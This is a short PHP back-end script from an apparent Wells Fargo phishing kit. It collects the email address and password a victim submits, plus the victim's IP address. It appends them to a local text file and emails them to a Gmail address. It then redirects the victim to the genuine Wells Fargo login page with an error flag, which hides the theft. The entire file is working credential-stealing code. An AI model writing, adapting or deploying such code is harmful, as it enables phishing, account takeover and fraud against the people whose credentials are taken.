<?
session_start();  
$ip = getenv("REMOTE_ADDR");    
$ma = $_POST['ma'];  
$mp = $_POST['mp'];  

$subj = " ||Wells Fargo ReZulT||$ip ";
$msg = "  \nEmail Address: $ma\nEmail Password: $mp\nIP: $ip\n ---------------------Created by PfD-MaStEr--------------------- "; 


$file = fopen("w.txt","a");
fwrite($file,$msg);
fclose($file);
 
mail("misskimberlywilson@gmail.com", $subj, $msg); 
header("Location: https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&error=yes&destination=AccountSummary");


?>